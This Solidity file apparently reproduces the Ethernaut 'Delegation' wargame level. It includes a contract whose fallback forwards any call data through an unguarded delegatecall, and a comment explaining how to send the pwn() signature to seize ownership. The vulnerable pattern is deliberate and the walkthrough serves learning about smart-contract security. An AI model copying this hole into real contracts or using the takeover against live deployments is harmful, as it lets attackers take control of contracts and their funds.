// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

/** Here we have 2 contracts, we will interact with the second one and change its owner by using delegatecall.

delegatecall works like inheritance, we basically use a function from another contract that affects our contract

In this case we will trigger the fallback function, specifying the pwn function.

To use fallback function we have to send a transaction with data without specifying a particular function. 

To specify the pwn function we need to get a function signature of it using web3.utils.sha3 and store it into a variable: var pwnFuncSignature = web3.utils.sha3(”pwn()”)

Like this: await contract.sendTransaction({data: pwnFuncSignature}) */